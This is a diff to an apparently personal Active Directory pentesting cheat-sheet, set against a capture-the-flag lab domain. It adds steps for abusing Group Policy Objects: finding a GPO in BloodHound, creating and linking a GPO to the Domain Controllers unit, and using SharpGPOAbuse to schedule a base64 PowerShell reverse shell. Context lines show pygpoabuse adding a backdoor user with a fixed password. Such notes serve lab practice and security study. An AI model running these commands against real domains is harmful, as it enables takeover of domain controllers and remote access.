@@ -438,6 +438,8 @@ https://www.hackingarticles.in/abusing-ad-dacl-writeowner/[abusing-ad-dacl-write
 [[GPO]]
 === GPO abuse
 
+In `bloodhound` search `Effective Inbound GPOs` parametr to identify a `SID` and `NAME` of `GPO`
+
 If user have *GenericAll* of other google it over *Default Domain Policy* and *Default Domain Contraoller Policy* , great tool for exploatation this is python script `pygpoabuse` .This script will add a user to AD with creds:
 `john`  :  `H4x00r123..` 
 
@@ -446,6 +448,36 @@ usage:
 ```bash
 python3 pygpoabuse.py domain/user:'pass' -command "powershell -exec bypass -enc JABjAGwAaQBlAG4AdAAgA...<SNIP>...AGwAbwBzAGUAKAApAA==" -dc-ip 10.10.10.10 -gpo-id "00000000-016D-11D2-945F-00C04FB984F9"
 ```
+
+Harder but more safe way if you can create a user by using `SharpGPOAbuse.exe` 
+requirements: `reverse shell`
+
+1.Create a new `GPO`
+
+```bash
+New-GPO -name 'exploit' 
+```
+
+2.Create link to `DOMAIN CONTROLLERS` group from created `GPO`
+
+```bash
+New-GPLINK -name 'exploit' -target 'OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB'
+```
+
+3.Create task which runs `powershell` command with reverse shell 
+payload search `reverse shell generator` -> PowerShell #3 (Base64)
+
+```bash
+.\SharpGPOAbuse.exe --AddComputerTask --GPOName exploit --Author exploit --TaskName RevShell --Command "powershell.exe" --Arguments "powershell -e JA<SNIP>AKAApAA=="
+```
+
+4.Update all gpo's which exists in system
+
+```bash
+gpupdate /force
+```
+
+
 
 Options:
 `-gpo-id` taken from bloodhound in Node field
